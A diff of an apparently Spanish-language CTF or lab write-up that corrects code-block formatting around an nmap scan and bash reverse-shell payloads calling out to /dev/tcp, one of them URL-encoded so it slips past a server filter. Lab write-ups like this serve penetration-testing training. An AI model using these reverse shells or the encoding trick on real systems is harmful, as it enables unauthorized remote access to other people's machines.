@@ -87,7 +87,7 @@ python3 -m http.server 4444
 
 Una detección de servicios más profunda (`-sCV`) en el puerto 80 reveló una configuración crítica de redireccionamiento.
 A service scan was performed, exposing a file named **"nota.txt"** inside the FTP service with the **anonymous** user.
-```json
+```bash
 nmap -sCV -p 22,80 -n -Pn 172.17.0.2 -oN servis
 
 PORT   STATE SERVICE VERSION
@@ -614,7 +614,9 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 
 Se utilizó una reverse shell clásica en **bash**, codificada con `%HEX` para evadir el filtro del servidor.
 ##### 🔐 Payload original (no permitido directamente):
-```bash -c "bash -i >& /dev/tcp/<IP_Atacante>/4444 0>&1"```
+```bash
+bash -c "bash -i >& /dev/tcp/<IP_Atacante>/4444 0>&1"
+```
 ##### ✅ Payload funcional (codificado en hexadecimal):
 ```bash
 bash+-c+%22bash+-i+%3E%26+/dev/tcp/192.168.0.19/4444+0%3E%261%22
